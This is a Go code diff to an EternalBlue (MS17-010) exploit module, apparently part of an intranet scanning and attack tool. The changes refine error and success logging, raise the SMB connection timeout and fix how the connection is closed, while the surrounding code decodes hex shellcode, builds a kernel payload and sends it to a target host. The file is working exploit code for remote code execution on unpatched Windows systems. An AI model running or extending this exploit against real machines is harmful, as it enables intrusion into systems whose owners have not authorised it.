@@ -50,15 +50,15 @@ func MS17010EXP(info *common.HostInfo) {
 
 	sc1, err := hex.DecodeString(sc)
 	if err != nil {
-		common.LogError(err)
+		common.LogError("[-] " + info.Host + " MS17-010 shellcode decode error " + err.Error())
 		return
 	}
 	err = eternalBlue(address, 12, 12, sc1)
 	if err != nil {
-		common.LogError(err)
+		common.LogError("[-] " + info.Host + " MS17-010 exp failed " + err.Error())
 		return
 	}
-	fmt.Println("[*] " + info.Host + " MS17-010 exploit end")
+	common.LogSuccess("[*] " + info.Host + "\tMS17-010\texploit end")
 }
 
 func eternalBlue(address string, initialGrooms, maxAttempts int, sc []byte) error {
@@ -66,7 +66,7 @@ func eternalBlue(address string, initialGrooms, maxAttempts int, sc []byte) erro
 	const maxscSize = packetMaxLen - packetSetupLen - len(loader) - 2 // uint16
 	l := len(sc)
 	if l > maxscSize {
-		fmt.Println(maxscSize)
+		//fmt.Println(maxscSize)
 		return fmt.Errorf("sc size %d > %d big %d", l, maxscSize, l-maxscSize)
 	}
 	payload := makeKernelUserPayload(sc)
@@ -187,15 +187,16 @@ func makeKernelUserPayload(sc []byte) []byte {
 }
 
 func smb1AnonymousConnectIPC(address string) (*smbHeader, net.Conn, error) {
-	conn, err := net.DialTimeout("tcp", address, 5*time.Second)
-	defer func() {
-		if conn != nil {
-			conn.Close()
-		}
-	}()
+	conn, err := net.DialTimeout("tcp", address, 10*time.Second)
 	if err != nil {
 		return nil, nil, fmt.Errorf("failed to connect host: %s", err)
 	}
+	var ok bool
+	defer func() {
+		if !ok {
+			_ = conn.Close()
+		}
+	}()
 	err = smbClientNegotiate(conn)
 	if err != nil {
 		return nil, nil, fmt.Errorf("failed to negotiate: %s", err)
@@ -213,6 +214,7 @@ func smb1AnonymousConnectIPC(address string) (*smbHeader, net.Conn, error) {
 	if err != nil {
 		return nil, nil, fmt.Errorf("failed to tree connect AndX: %s", err)
 	}
+	ok = true
 	return header, conn, nil
 }
 
